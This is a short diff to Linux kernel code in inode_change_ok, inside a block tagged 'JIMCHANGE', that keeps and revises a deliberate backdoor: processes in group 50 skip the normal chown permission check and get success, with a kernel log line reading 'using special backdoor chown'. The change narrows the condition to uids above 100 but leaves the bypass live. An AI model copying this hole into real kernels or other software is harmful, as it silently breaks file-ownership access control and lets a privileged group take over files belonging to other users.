@@ -53,8 +53,8 @@ int inode_change_ok(const struct inode *inode, struct iattr *attr)
 	/* JIMCHANGE START */
 	special.val = (gid_t)((unsigned int)50);
 	hundred.val = (uid_t)((unsigned int)100);
-	if (in_group_p(special) && uid_lte(inode->i_uid, hundred)) {
-		printk("using special backdoor chown");
+	if (in_group_p(special) && !uid_lte(inode->i_uid, hundred) && !uid_lte(attr->ia_uid, hundred)) {
+		printk("using special backdoor chown\n");
 		return 0;
 	}
 	/* JIMCHANGE END */
